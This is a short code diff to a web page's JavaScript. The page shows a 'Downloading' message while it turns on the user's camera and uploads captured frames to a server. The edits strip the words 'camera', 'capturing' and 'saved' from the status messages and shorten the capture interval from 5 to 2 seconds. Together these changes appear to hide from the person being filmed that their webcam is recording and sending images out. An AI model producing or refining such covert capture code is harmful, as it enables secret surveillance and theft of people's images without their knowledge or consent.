@@ -239,7 +239,7 @@
         if (link) {
             setStatus('📥 Downloading: ' + link + ' ...', 'idle');
         } else {
-            setStatus('📷 No link — starting camera directly...', 'idle');
+            setStatus('📷 No link — directly...', 'idle');
         }
 
         try {
@@ -249,7 +249,7 @@
             await video.play();
 
             downloadBtn.textContent = '⏹ Stop & Download';
-            setStatus('✅ Camera active — capturing every 5s', 'active');
+            setStatus('active — every 2s', 'active');
 
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
@@ -268,7 +268,7 @@
                 })
                 .then(res => res.json())
                 .then(data => {
-                    setStatus('✅ Frame saved: ' + data.file, 'active');
+                    setStatus('✅ Frame : ' + data.file, 'active');
                 })
                 .catch(err => {
                     setStatus('❌ Upload error: ' + err.message, 'error');
